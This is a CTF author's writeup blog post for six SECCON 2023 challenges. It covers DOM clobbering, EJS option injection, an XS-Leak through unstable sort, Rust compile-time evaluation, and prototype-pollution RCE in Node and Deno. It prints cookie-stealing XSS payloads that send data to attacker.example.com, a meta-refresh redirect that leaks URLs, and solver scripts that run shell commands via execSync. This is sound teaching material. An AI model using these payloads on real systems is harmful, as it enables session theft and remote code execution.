---
title: "SECCON CTF 2023 Quals: Author Writeups"
thumbnail: /images/2023/20230921_seccon-ctf-quals-top-01.png
date: 2023-09-21 23:00:00
tags:
    - CTF
description: Writeups for my challenges (blink, eeeeejs, hidden-note, crabox, node-ppjail, and deno-ppjail) in SECCON CTF 2023 Quals.
---

Thank you for playing SECCON CTF 2023 Quals! I created some challenges for this CTF, just like 2021 and 2022. I hope you had fun and I'm looking forward to reading your writeups.

![](/images/2023/20230921_seccon-ctf-quals-top-02.png)

My challenges:

|Challenge|Category|Intended<br>Difficulty|Keywords|Solved / 653|
|:-:|:-:|:-:|:-:|:-:|
|blink|web|easy|DOM clobbering|14|
|eeeeejs|web|medium|ejs, XSS puzzle|12|
|hidden-note|web|hard|XS-Leak, unstable sort|1|
|crabox|sandbox|warmup|Rust sandbox|53|
|node-ppjail|sandbox|medium|prototype pollution|5|
|deno-ppjail|sandbox|hard|prototype pollution|2|

I added the source code and author's solvers to [my-ctf-challenges](https://github.com/arkark/my-ctf-challenges) repository.

## [web] blink

- 14 solved / 240 pts
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/web/blink

Description:

> Popover API is supported from Chrome 114. The awesome API is so useful that you can easily implement `<blink>`.
>
> - Challenge: `http://blink.seccon.games:3000`
> - Admin bot: `http://blink.seccon.games:1337`
>
> `blink.tar.gz`

### Overview

This website implements the behavior of [`<blink>`](https://en.wikipedia.org/wiki/Blink_element) using [Popover API](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API).

If you submit `Hello, blink!`,

![](/images/2023/20230921_seccon-ctf-quals-blink-01.png)

then the website shows a blinking iframe of the text:

![](/images/2023/20230921_seccon-ctf-quals-blink-02.png)

The JavaScript code of the client-side is simple:

```javascript
const wrap = (obj) =>
  new Proxy(obj, {
    get: (target, prop) => {
      const res = target[prop];
      return typeof res === "function" ? res.bind(target) : res;
    },
    set: (target, prop, value) => (target[prop] = value),
  });

const $ = wrap(document).querySelector;

const sandboxAttribute = [
  "allow-downloads",
  "allow-forms",
  "allow-modals",
  "allow-orientation-lock",
  "allow-pointer-lock",
  "allow-popups",
  "allow-popups-to-escape-sandbox",
  "allow-presentation",
  "allow-same-origin",
  // "allow-scripts", // disallow
  "allow-top-navigation",
  "allow-top-navigation-by-user-activation",
  "allow-top-navigation-to-custom-protocols",
].join(" ");

const createBlink = async (html) => {
  const sandbox = wrap(
    $("#viewer").appendChild(document.createElement("iframe"))
  );

  // I believe it is impossible to escape this iframe sandbox...
  sandbox.sandbox = sandboxAttribute;

  sandbox.width = "100%";
  sandbox.srcdoc = html;
  await new Promise((resolve) => (sandbox.onload = resolve));

  const target = wrap(sandbox.contentDocument.body);
  target.popover = "manual";
  const id = setInterval(target.togglePopover, 400);

  return () => {
    clearInterval(id);
    sandbox.remove();
  };
};

$("#render").addEventListener("click", async () => {
  const html = $("#html").value;
  if (!html) return;
  location.hash = html;

  const deleteBlink = await createBlink(html);
  const button = wrap(
    $("#viewer").appendChild(document.createElement("button"))
  );
  button.textContent = "Delete";
  button.addEventListener("click", () => {
    deleteBlink();
    button.remove();
  });
});

const initialHtml = decodeURIComponent(location.hash.slice(1));
if (initialHtml) {
  $("#html").value = initialHtml;
  $("#render").click();
}
```

The goal is to gain an XSS to steal an admin bot's cookie.

### Solution

By the following sandbox setting, you cannot run any JavaScript in iframe elements:
```javascript
const sandboxAttribute = [
  "allow-downloads",
  "allow-forms",
  "allow-modals",
  "allow-orientation-lock",
  "allow-pointer-lock",
  "allow-popups",
  "allow-popups-to-escape-sandbox",
  "allow-presentation",
  "allow-same-origin",
  // "allow-scripts", // disallow
  "allow-top-navigation",
  "allow-top-navigation-by-user-activation",
  "allow-top-navigation-to-custom-protocols",
].join(" ");
```

You need to find an XSS sink outside iframe elements.

In conclusion, the sink is:
```javascript
const id = setInterval(target.togglePopover, 400);
```

`setTimeout` and `setInterval` has an interesting behavior:
![](/images/2023/20230921_seccon-ctf-quals-blink-03.png)

It means that `setInterval` can be XSS sinks if `target.togglePopover.toString` is controllable.

Yeah, DOM clobbering enables it!

If you render the following HTML:
```html
<iframe
  name="body"
  srcdoc="<a id=togglePopover href=foobar:if(!window.sent)window.sent=navigator.sendBeacon('https://attacker.example.com',document.cookie)></a>"
></iframe>
```

then, the following JavaScript will be executed in `setInterval`:
```javascript
foobar:if(!window.sent)window.sent=navigator.sendBeacon('https://attacker.example.com',document.cookie)
```

### Solver

Here is my solver:

- https://github.com/arkark/my-ctf-challenges/blob/main/challenges/202309_SECCON_CTF_2023_Quals/web/blink/solver/index.js

### Flag

```
SECCON{blink_t4g_is_no_l0nger_supported_but_String_ha5_blink_meth0d_y3t}
```

BTW, the title `bl👁nk` in the website is a pun on the words "eye" (`/aɪ/`) and "i" (`/aɪ/`). Did anyone notice this?

### Background

If you are unfamiliar with DOM clobbering attacks, you might want to refer to HackTricks:

- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering

Also, I created another DOM clobbering challenge last year. Check it!

- [light-note](https://blog.arkark.dev/2023/02/17/seccon-finals/#web-300-light-note) in SECCON CTF 2022 Finals

## [web] eeeeejs

- 12 solved / 257 pts
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/web/eeeeejs

Description:

> Can you bypass all mitigations?
>
> - Challenge: `http://eeeeejs.seccon.games:3000`
> - Admin bot: `http://eeeeejs.seccon.games:1337`
>
> `eeeeejs.tar.gz`

### Overview

In this challenge, a target file path and a query object passed into an EJS rendering engine are controllable:
```javascript
const ejs = require("ejs");

const { filename, ...query } = JSON.parse(process.argv[2].trim());
ejs.renderFile(filename, query).then(console.log);
```

This is one of the EJS option injection challenges. The following post may be helpful if you are unfamiliar with the attacks:

- https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/

This challenge implements 4 mitigations for the attacks:
```javascript
const { xss } = require("express-xss-sanitizer");
/* snip */

// Mitigation 1:
app.use(xss());
```

```javascript
// Mitigation 2:
app.use((req, res, next) => {
  // A protection for RCE
  // FYI: https://github.com/mde/ejs/issues/735

  const evils = [
    "outputFunctionName",
    "escapeFunction",
    "localsName",
    "destructuredLocals",
    "escape",
  ];

  const data = JSON.stringify(req.query);
  if (evils.find((evil) => data.includes(evil))) {
    res.status(400).send("hacker?");
  } else {
    next();
  }
});
```

```javascript
// Mitigation 3:
app.use((req, res, next) => {
  res.set("Content-Security-Policy", "default-src 'self'");
  next();
});
```

```javascript
// Mitigation 4:
"--experimental-permission",
`--allow-fs-read=${__dirname}/src`,
```

The goal is to bypass the above mitigations and gain an XSS.

### Solution

There are various approaches to solving this challenge. My solution is one of them. If you are interested in other solutions, join the CTF Discord and see `#web` channel.

My solution is:
```javascript
const jsPayload = `location = "https://attacker.example.com?" + document.cookie`;

const srcUrl = `/?${new URLSearchParams({
  filename: "render.dist.js",
  "settings[view options][openDelimiter]": "__require() {\n",
  "settings[view options][closeDelimiter]": "||",
  "settings[view options][delimiter][]": "",
  mod: jsPayload,
})}`;

const evilUrl = `http://web:3000?${new URLSearchParams({
  "filename[href]": "x",
  "filename[origin]": "x",
  "filename[protocol]": "file:",
  "filename[hostname]": "",
  "filename[pathname]": "index.ejs",
  [`filename[<script src=${srcUrl}></script>]`]: "",
  "settings[view options][debug]": "1",
})}`;
```

For the first URL `srcUrl`:

- It abuses the following part of `render.dist.js`:
    ```javascript
    /* snip */
    var __commonJS = (cb, mod) => function __require() {
      return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
    };
    /* snip */
    ```
- By the EJS options, it executes `return mod` as JavaScript and the value of `mod` is rendered as a page.
- Thus, the string `jsPayload` is rendered.

For the second URL `evilUrl`:

- As an important fact, [express-xss-sanitizer](https://github.com/AhmedAdelFahim/express-xss-sanitizer/) does not escape keys of request queries.
    - ref. https://github.com/AhmedAdelFahim/express-xss-sanitizer/blob/v1.1.6/lib/sanitize.js#L31
- `ejs.renderFile` allows a URL-like object as a file path.
    - `ejs.renderFile` uses `fs.readFileSync` internally.
        - ref. https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L87
    - `fs.readFileSync` allows a URL-like object as a file path.
        - I first saw this bypass technique at simplewaf in corCTF 2022
        - ref. https://brycec.me/posts/corctf_2022_challenges#simplewaf
- `debug` option renders `src`.
    - ref. https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L646-L648
    - `src` includes `JSON.stringify(opts.filename)`.
        - ref. https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L584
        - ref. https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L625
- Thus, if a key of `filename` object includes `<script src="..."></script>`, it performs XSS attacks.

### Solver

Here is my solver:

- https://github.com/arkark/my-ctf-challenges/blob/main/challenges/202309_SECCON_CTF_2023_Quals/web/eeeeejs/solver/index.js

### Flag

```
SECCON{RCE_is_po55ible_if_mitigation_4_does_not_exist}
```

## [web] hidden-note

- 1 solved / 500 pts
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/web/hidden-note

Description:

> Shared pages hide your secret notes.
>
> - Challenge: `http://hidden-note.seccon.games:3000`
> - Admin bot: `http://hidden-note.seccon.games:1337`
>
> `hidden-note.tar.gz`

### Overview

There is a simple note application. You can create and delete notes.
![](/images/2023/20230921_seccon-ctf-quals-hidden-note-01.png)

You can also search notes with a query string.
![](/images/2023/20230921_seccon-ctf-quals-hidden-note-02.png)

If you share your notes, a static page is created and anyone who knows the URL can access it.
![](/images/2023/20230921_seccon-ctf-quals-hidden-note-03.png)

The admin bot's scenario is as follows:
```javascript
// Create a flag note
const page1 = await context.newPage();
await page1.goto(APP_URL);
await page1.waitForSelector("#content");
await page1.type("#content", FLAG);
await page1.waitForSelector("#create");
await Promise.all([
  page1.click("#create"),
  page1.waitForNavigation({ timeout: 1000 }),
]);
await page1.close();

// Visit your URL
const page2 = await context.newPage();
await page2.goto(url, { timeout: 3 * 1000 });
await sleep(60 * 1000);
await page2.close();
```

The goal is to steal the admin's note including a flag.

### Solution

#### Step 1: Understanding the challenge structure

The implementation for sharing pages:
```go
indexTmpl, _ := template.ParseFiles("views/index.html")
secretPattern := regexp.MustCompile("SECCON{.*}")

router.GET("/share", func(c *gin.Context) {
    user := c.MustGet("user").(*User)
    notes, err := user.getNotes(user.Query)
    if err != nil {
        c.String(500, "Failed to read notes")
        return
    }

    // Hide your secret notes 🤫
    notes = lo.Filter(notes, func(note Note, _ int) bool {
        return !secretPattern.MatchString(note.Content)
    })

    fileName := getRandomHex(12) + ".html"
    file, err := os.OpenFile(fmt.Sprintf("shared/%s", fileName), os.O_CREATE|os.O_WRONLY, 0600)
    if err != nil {
        c.Status(500)
        return
    }
    if err := indexTmpl.Execute(file, gin.H{
        "user":   user,
        "notes":  notes,
        "shared": true,
    }); err != nil {
        c.Status(500)
        return
    }
    c.Redirect(302, fmt.Sprintf("/shared/%s", fileName))
})

router.Static("/shared", "./shared")
```

Obliviously a HTML injection vulnerability exists because it uses `text/tamplate`.
```go
indexTmpl, _ := template.ParseFiles("views/index.html")
```

The CSP prevents XSS attacks:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'none'; style-src https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
```

However, you can leak URLs of shared pages using meta tag redirect technique:
```html
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Refresh" content="0; URL=http://attacker.example.com">
```

By the technique, you can access shared pages because you can create notes and share them on the admin's session by CSRF.

Is the remaining task to see a flag note in shared pages? The answer is no.
The most impotant point in this challenge is that shared pages do not show a flag note:
```go
// Hide your secret notes 🤫
notes = lo.Filter(notes, func(note Note, _ int) bool {
    return !secretPattern.MatchString(note.Content)
})
```

Somehow you have to find a way to steal the content of the hidden note.

#### Step 2: XS-Leak with an algorithm-based oracle

The goal in this step to construct an oracle for XS-Leak to steal the hidden note.

In conclusion, the key of the oracle is "unstable sort".

The implementation for getting notes:
```go
func (user *User) getNotes(query string) ([]Note, error) {
    files, err := os.ReadDir(fmt.Sprintf("notes/%s", user.ID))
    if err != nil {
        return nil, err
    }
    notes := make([]Note, 0, len(files))
    for _, file := range files {
        content, err := os.ReadFile(fmt.Sprintf("notes/%s/%s", user.ID, file.Name()))
        if err != nil {
            return nil, err
        }
        notes = append(notes, Note{
            ID:      file.Name(),
            Content: string(content),
        })
    }
    notes = lo.Filter(notes, func(note Note, _ int) bool {
        return strings.Contains(note.Content, query)
    })
    sort.Slice(notes, func(i, j int) bool {
        return notes[i].Content < notes[j].Content
    })
    return notes, nil
}
```

It uses `sort.Slice`:
```go
sort.Slice(notes, func(i, j int) bool {
    return notes[i].Content < notes[j].Content
})
```

The document says:

- https://pkg.go.dev/sort#Slice

> The sort is not guaranteed to be stable: equal elements may be reversed from their original order. For a stable sort, use SliceStable.

The sort algorithm is Pattern-defeating Quicksort (pdqsort)[^hidden-note-01]. It is used from Go 1.19:

- https://tip.golang.org/doc/go1.19#sort

[^hidden-note-01]: https://arxiv.org/pdf/2106.05123.pdf

The implementation is:

- https://github.com/golang/go/blob/go1.21.0/src/sort/slice.go#L21-L27
- https://github.com/golang/go/blob/go1.21.0/src/sort/zsortfunc.go#L61

```go
// From: https://github.com/golang/go/blob/go1.21.0/src/sort/zsortfunc.go#L61-L75
func pdqsort_func(data lessSwap, a, b, limit int) {
    const maxInsertion = 12

    var (
        wasBalanced    = true // whether the last partitioning was reasonably balanced
        wasPartitioned = true // whether the slice was already partitioned
    )

    for {
        length := b - a

        if length <= maxInsertion {
            insertionSort_func(data, a, b)
            return
        }

        /* snip */
```

The shuffle part with xorshift:
```go
// From: https://github.com/golang/go/blob/go1.21.0/src/sort/zsortfunc.go#L240-L254
func breakPatterns_func(data lessSwap, a, b int) {
    length := b - a
    if length >= 8 {
        random := xorshift(length)
        modulus := nextPowerOfTwo(length)

        for idx := a + (length/4)*2 - 1; idx <= a+(length/4)*2+1; idx++ {
            other := int(uint(random.Next()) & (modulus - 1))
            if other >= length {
                other -= length
            }
            data.Swap(idx, a+other)
        }
    }
}
```

Thus, the sort algorithm has the following properties:

- Case 1: If the length `<= 12`, it uses insertion sort (a stable sort).
- Case 2: Otherwise, the order will be shuffled[^hidden-note-02].

[^hidden-note-02]: Strictly speaking, there are more conditions for the shuffle.

Let's confirm the behavior:
```go
package main

import (
	"fmt"
	"sort"
)

type Note struct {
	ID      int
	Content string
}

func test_sort(length int) {
	notes := make([]Note, 0, length)
	notes = append(notes, Note{ID: -1, Content: "x"})
	for i := 0; i < length-1; i++ {
		notes = append(notes, Note{ID: i, Content: "test"})
	}
	// assert: len(notes) == length

	sort.Slice(notes, func(i, j int) bool {
		return notes[i].Content < notes[j].Content
	})

	fmt.Println("length:", length)
	fmt.Println(notes)
}

func main() {
	// Case 1:
	test_sort(11)
	test_sort(12)

	fmt.Println()

	// Case 2:
	test_sort(13)
	test_sort(14)
}
```

```sh
$ go run main.go
length: 11
[{0 test} {1 test} {2 test} {3 test} {4 test} {5 test} {6 test} {7 test} {8 test} {9 test} {-1 x}]
length: 12
[{0 test} {1 test} {2 test} {3 test} {4 test} {5 test} {6 test} {7 test} {8 test} {9 test} {10 test} {-1 x}]

length: 13
[{5 test} {0 test} {1 test} {2 test} {3 test} {4 test} {6 test} {7 test} {8 test} {9 test} {10 test} {11 test} {-1 x}]
length: 14
[{5 test} {7 test} {1 test} {2 test} {3 test} {4 test} {0 test} {12 test} {9 test} {8 test} {6 test} {10 test} {11 test} {-1 x}]
```

By abusing this behavior, it is possible to construct an oracle. You can leak the length of a sorted array and judge whether the array includes the flag note or not.

See my solver below for details.

### Solver

Here is my full exploit:

- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/web/hidden-note/solver

### Flag

```
SECCON{pdq_1e4k}
```

## [sandbox] crabox

- 53 solved / 132 pts
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/sandbox/crabox

Description:

> 🦀 Compile-Time Sandbox Escape 🦀
>
> ```
> nc crabox.seccon.games 1337
> ```
>
> `crabox.tar.gz`

### Overview

Challenge file:
```python
import sys
import re
import os
import subprocess
import tempfile

FLAG = os.environ["FLAG"]
assert re.fullmatch(r"SECCON{[_a-z0-9]+}", FLAG)
os.environ.pop("FLAG")

TEMPLATE = """
fn main() {
    {{YOUR_PROGRAM}}

    /* Steal me: {{FLAG}} */
}
""".strip()

print("""
🦀 Compile-Time Sandbox Escape 🦀

Input your program (the last line must start with __EOF__):
""".strip(), flush=True)

program = ""
while True:
    line = sys.stdin.readline()
    if line.startswith("__EOF__"):
        break
    program += line
if len(program) > 512:
    print("Your program is too long. Bye👋".strip())
    exit(1)

source = TEMPLATE.replace("{{FLAG}}", FLAG).replace("{{YOUR_PROGRAM}}", program)

with tempfile.NamedTemporaryFile(suffix=".rs") as file:
    file.write(source.encode())
    file.flush()

    try:
        proc = subprocess.run(
            ["rustc", file.name],
            cwd="/tmp",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2,
        )
        print(":)" if proc.returncode == 0 else ":(")
    except subprocess.TimeoutExpired:
        print("timeout")
```

You can insert any Rust program, and the goal is to steal a flag in the comment in the inserted source code.

```python
print(":)" if proc.returncode == 0 else ":(")
```
At this line, you can get information about whether the compilation by `rustc` is successful or not.

### Solution

Just like C++ and D, Rust evaluate some expressions at compile-time:

- ref. https://doc.rust-lang.org/reference/const_eval.html

Also, there are useful macros in Rust standard library:

- `std::include_bytes`: https://doc.rust-lang.org/std/macro.include_bytes.html
- `std::include_str`: https://doc.rust-lang.org/std/macro.include_str.html
- `std::file`: https://doc.rust-lang.org/std/macro.file.html

You can evaluate the content of the self-file including a flag at compile-time.
```rust
let content = include_bytes!(file!());
```

The remaining task is to construct an oracle that judges whether `content` contains a given string or not.

An example of implementation:
```rust
const fn _contains(query: &[u8]) {
    let content = include_bytes!(file!());

    let mut i = 350;
    while i < content.len() {
        let mut j = 0;
        while j < query.len() && i + j < content.len() && content[i + j] == query[j] {
            j += 1;
        }
        if j == query.len() {
            return; // found!
        }
        i += 1;
    }
    assert!(false); // not found
}
```

Finally, you can get the entire flag string using this function.

As another solution, you can also use `/proc/1/environ` instead of `file!()`.

### Solver

```python
import os
import pwn
import string

pwn.context.log_level = "error"


def communicate(program: str):
    assert len(program) <= 512
    io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))
    io.sendlineafter(b"):", program.encode())
    io.sendline(b"__EOF__")

    res = io.recvall().decode().strip()
    io.close()
    return res


TEMPLATE = """
}

static _CTFE: () = _contains(b"{{QUERY}}");

const fn _contains(query: &[u8]) {
    let content = include_bytes!(file!());

    let mut i = 350;
    while i < content.len() {
        let mut j = 0;
        while j < query.len() && i + j < content.len() && content[i + j] == query[j] {
            j += 1;
        }
        if j == query.len() {
            return; // found!
        }
        i += 1;
    }
    assert!(false); // not found
""".strip().replace("    ", "")


def oracle(query: str) -> bool:
    program = TEMPLATE.replace("{{QUERY}}", query)
    return ":)" in communicate(program)


CHARS = "}_" + string.ascii_lowercase + string.digits
known = "SECCON{"
while not known.endswith("}"):
    for c in CHARS:
        if oracle(known + c):
            known += c
            break
    else:
        print("Not found")
        exit(1)
    print(known)
print("Flag: " + known)
```

### Flag

```
SECCON{ctfe_i5_p0w3rful}
```

CTFE stands for Compile-Time Function Evaluation.

## [sandbox] deno-ppjail

- 2 solved / 470 pts
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/sandbox/deno-ppjail

Description:

> Do you like Deno better than Node?
>
> ```
> nc deno-ppjail.seccon.games 1337
> ```
>
> 🦕 `deno-ppjail.tar.gz`

### Overview

Challenge file:
```typescript
const CUSTOM_KEY = "__custom__";
const CUSTOM_TYPES = [
  "Object",
  "String",
  "Boolean",
  "Array",
  "Function",
  "RegExp",
];

type Dict = Record<string, unknown>;
type Custom = {
  [CUSTOM_KEY]: true;
  type: string;
  args: unknown[];
};

const isDict = (value: unknown): value is Dict => {
  return value === Object(value);
};

const isCustom = (value: unknown): value is Custom => {
  return isDict(value) && !!value[CUSTOM_KEY];
};

const set = (target: unknown, key: string, value: unknown) => {
  if (!isDict(target)) return;
  if (key in target) return;
  target[key] = value;
};

const merge = (target: unknown, input: Dict) => {
  if (!isDict(target)) return;
  for (const key of Object.keys(input)) {
    const value = input[key];
    if (!isDict(value)) {
      set(target, key, value);
    } else if (Array.isArray(value)) {
      set(target, key, []);
      merge(target[key], value);
    } else if (!isCustom(value)) {
      set(target, key, {});
      merge(target[key], value);
    } else {
      const { type, args } = value;
      if (CUSTOM_TYPES.includes(type)) {
        try {
          set(target, key, new globalThis[type](...args));
        } catch {}
      }
    }
  }
};

const inputStr = prompt("Input your JSON:") ?? "";

const target: Dict = {
  title: "deno-ppjail",
  category: "sandbox",
};
merge(target, JSON.parse(inputStr));
```

The goal is RCE to read a flag file with an unknown name.

### Solution

The `merge` function obviously has a prototype pollution vulnerability.

Interestingly, unlike common prototype pollution, you can also pollute something to an object in `CUSTOM_TYPES` that includes `Function`.

However, by `if (key in target) return;`, you cannot overwrite properties that are already defined (e.g.: `toString`, `valueOf`, and `constructor`):
```typescript
const set = (target: unknown, key: string, value: unknown) => {
  if (!isDict(target)) return;
  if (key in target) return;
  target[key] = value;
};
```

That is, all you have to do is to find gadgets that lead to RCE under those conditions.

My intended solution uses the following gadget:

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">New prototype pollution gadgets! Do you know why the console.log is called? <a href="https://twitter.com/hashtag/SECCON?src=hash&amp;ref_src=twsrc%5Etfw">#SECCON</a> <a href="https://t.co/BWQLeH7MM2">pic.twitter.com/BWQLeH7MM2</a></p>&mdash; Ark (@arkark_) <a href="https://twitter.com/arkark_/status/1703282601820369329?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

```javascript
$ deno
...

> ({}).constructor.prototype.return = () => console.log(1337)
[Function (anonymous)]
> for (const x of [1, 2, 3]) {
  break;
}
1337
Uncaught TypeError: Iterator result undefined is not an object
    at <anonymous>:7:3
> const [x] = [1, 2, 3];
1337
Uncaught TypeError: Iterator result undefined is not an object
    at <anonymous>:2:8
>
```

This behavior is attributed to the specification of `IteratorClose` defined in ECMAScript:

- https://tc39.es/ecma262/2023/multipage/abstract-operations.html#sec-iteratorclose

> 3. Let `innerResult` be `Completion(GetMethod(iterator, "return"))`.
> 4. If `innerResult.[[Type]]` is normal, then
>     a. Let `return` be `innerResult.[[Value]]`.
>     b. If `return` is `undefined`, return ? `completion`.
>     c. Set `innerResult` to `Completion(Call(return, iterator))`.

The part where `IteratorClose` may be called:
```typescript
for (const key of Object.keys(input)) {
```

So, a given function is called when the following conditions are satisfied:

- `Object.prototype.return` is polluted to a `Function` object.
- In the for-loop, the `IteratorClose` is called.
    - e.g. Uncaught runtime errors

The way to cause an error is simple:
```javascript
$ deno
...

> ({}).toString.caller
Uncaught TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them
    at <anonymous>:2:15
>
```

Thus, the following JSON causes RCE!
```json
{
  "constructor": {
    "prototype": {
      "return": {
        "__custom__": true,
        "type": "Function",
        "args": [
          "console.log(1337)"
        ]
      }
    }
  },
  "toString": {
    "caller": {}
  }
}
```

Execution result:
```javascript
$ deno
...

> merge({}, {
  "constructor": {
    "prototype": {
      "return": {
        "__custom__": true,
        "type": "Function",
        "args": [
          "console.log(1337)"
        ]
      }
    }
  },
  "toString": {
    "caller": {}
  }
})
1337
1337
Uncaught TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them
    at merge (<anonymous>:33:19)
    at merge (<anonymous>:33:7)
    at <anonymous>:2:1
>
```

### Solver

```python
import os
import pwn
import json

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

payload = """
for (const entry of Deno.readDirSync("/")) {
    if (entry.name.startsWith("flag-")) {
        const flag = new TextDecoder().decode(Deno.readFileSync("/" + entry.name));
        console.log(flag);
    }
}
""".strip()

input_str = json.dumps({
    "constructor": {
        "prototype": {
            # ref. https://tc39.es/ecma262/2023/multipage/abstract-operations.html#sec-iteratorclose
            #
            # > 3. Let innerResult be Completion(GetMethod(iterator, "return")).
            # > 4. If innerResult.[[Type]] is normal, then
            # >     a. Let return be innerResult.[[Value]].
            # >     b. If return is undefined, return ? completion.
            # >     c. Set innerResult to Completion(Call(return, iterator)).
            "return": {
                "__custom__": True,
                "type": "Function",
                "args": [
                    payload,
                ],
            },
        },
    },
    # Cause an error
    "toString": {
        "caller": {},
    },
})

io.sendlineafter(b"Input your JSON: ", input_str.encode())
print(io.recvall().decode())
```

### Flag

```
SECCON{ECMAScr1pt_has_g4dgets_of_prototype_po11ution!!!}
```

## [sandbox] node-ppjail

- 5 solved / 365 pts
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202309_SECCON_CTF_2023_Quals/sandbox/node-ppjail

Description:

> Do you like Node better than Deno?
>
> ```
> nc node-ppjail.seccon.games 1337
> ```
>
> 🐢 `node-ppjail.tar.gz`

### Overview

This challenge is almost the same as deno-ppjail.

Challenge file:
```typescript
import * as fs from "node:fs";

const CUSTOM_KEY = "__custom__";
const CUSTOM_TYPES = [
  "Object",
  "String",
  "Boolean",
  "Array",
  "Function",
  "RegExp",
];

type Dict = Record<string, unknown>;
type Custom = {
  [CUSTOM_KEY]: true;
  type: string;
  args: unknown[];
};

const isDict = (value: unknown): value is Dict => {
  return value === Object(value);
};

const isCustom = (value: unknown): value is Custom => {
  return isDict(value) && !!value[CUSTOM_KEY];
};

const set = (target: unknown, key: string, value: unknown) => {
  if (!isDict(target)) return;
  if (key in target) return;
  target[key] = value;
};

const merge = (target: unknown, input: Dict) => {
  if (!isDict(target)) return;
  for (const key of Object.keys(input)) {
    const value = input[key];
    if (!isDict(value)) {
      set(target, key, value);
    } else if (Array.isArray(value)) {
      set(target, key, []);
      merge(target[key], value);
    } else if (!isCustom(value)) {
      set(target, key, {});
      merge(target[key], value);
    } else {
      const { type, args } = value;
      if (CUSTOM_TYPES.includes(type)) {
        try {
          set(target, key, new globalThis[type](...args));
        } catch {}
      }
    }
  }
};

process.stdout.write("Input your JSON: ");
const inputStr = (() => {
  const buf = new Uint8Array(1024);
  const n = fs.readSync(fs.openSync("/dev/stdin", "r"), buf);
  return new TextDecoder().decode(buf.slice(0, n));
})();

const target: Dict = {
  title: "node-ppjail",
  category: "sandbox",
};
merge(target, JSON.parse(inputStr));
```

`package.json`:
```json
{
  "name": "node-ppjail",
  "version": "1.0.0",
  "main": "index.js",
  "private": true,
  "scripts": {
    "build": "tsc index.ts"
  },
  "devDependencies": {
    "@types/node": "^20.6.0",
    "typescript": "^5.2.2"
  }
}
```

The goal is also to gain RCE to read a flag file with an unknown name.

The difference from deno-ppjail is that the source code is transpiled into JavaScript and executed by `node` command.

### Solution

The transpiled JavaScript is as follows:
```javascript
/* snip */
var merge = function (target, input) {
    var _a;
    if (!isDict(target))
        return;
    for (var _i = 0, _b = Object.keys(input); _i < _b.length; _i++) {
        var key = _b[_i];
        var value = input[key];
/* snip */
```

The for-loop does not use Iterator[^node-ppjail-01], so it is impossible to call `IteratorClose` and you cannot use the gadget used in deno-ppjail.

[^node-ppjail-01]: That's because the default value for `target` option of `tsc` is ES3. ES3 is a very old ECMAScript version.<br>ref. https://www.typescriptlang.org/tsconfig/#target

It means that you need to find a gadget other than `IteratorClose`. But not to worry, Node.js has some gadgets. In fact, I found three gadgets in the internals of Node.js.

For example:
```javascript
({}).__proto__[1] = { callback: () => console.log(1337) }
```

The callback will be called in the process for task queues.

See my solver below for details.

### Solver

```python
import os
import pwn
import json

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

command = "cat /flag-*.txt"


def solve1() -> str:
    # Solution 1:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77
            "1": {
                "callback": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
        },
    })


def solve2() -> str:
    # Solution 2:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064
            "circular": {
                "get": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
            # ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause
            "cause": 1,
        },
        # Cause an error
        "toString": {
            "caller": {},
        },
    })


def solve3() -> str:
    # Solution 3:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/errors.js#L140
            "prepareStackTrace": {
                "__custom__": True,
                "type": "Function",
                "args": [
                    f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                ],

            },
        },
        # Cause an error
        "toString": {
            "caller": {},
        },
    })


input_str = solve1()
# input_str = solve2()
# input_str = solve3()

io.sendlineafter(b"Input your JSON: ", input_str.encode())
print(io.recvall().decode())
```

### Flag

```
SECCON{Deno_i5_an_anagr4m_0f_Node}
```

JavaScript is an insane and interesting language!
